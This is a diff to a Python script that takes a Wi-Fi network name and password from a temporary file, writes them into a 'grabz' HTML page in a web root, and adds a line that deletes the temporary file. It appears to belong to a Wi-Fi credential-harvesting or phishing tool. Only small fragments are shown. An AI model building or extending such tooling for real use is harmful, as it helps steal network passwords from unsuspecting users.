@@ -1,5 +1,7 @@
 #!/usr/bin/python3
 from time import strftime, localtime
+from os import remove
+
 
 # read data from tmp.txt
 def read_data():
@@ -33,7 +35,7 @@ def write_grab(wifi_ssd, wifi_password):
         new_page = new_page + line + "\n"
     with open("webroot/grabz.html", 'w') as fp:
         fp.write(new_page)
-
+    remove("tmp.txt")
 if __name__ == '__main__':
     data = read_data()
     wifi_ssd, wifi_password = filter_data(data)
